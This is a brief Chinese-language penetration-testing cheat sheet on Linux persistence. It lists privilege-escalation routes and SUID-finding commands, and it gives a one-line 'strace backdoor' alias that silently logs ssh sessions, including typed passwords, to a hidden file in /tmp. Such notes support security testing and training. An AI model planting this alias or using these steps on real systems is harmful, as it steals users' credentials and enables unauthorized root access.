持久化 - Linux
========================================

权限提升
----------------------------------------
- 内核漏洞利用
- 攻击有root权限的服务
- 通过有SUID属性的可执行文件
    - 查找可能提权的可执行文件
    - ``find / -perm +4000 -ls``
    - ``find / -perm -u=s -type f 2>/dev/null``
    - ``find / -user root -perm -4000 -print 2>/dev/null``
    - ``find / -user root -perm -4000 -exec ls -ldb {} \;``
- 利用可用的root权限
    - ``sudo -l``
- 利用误配置的 crontab 任务

后门
----------------------------------------
- strace 后门
    - ``alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'``
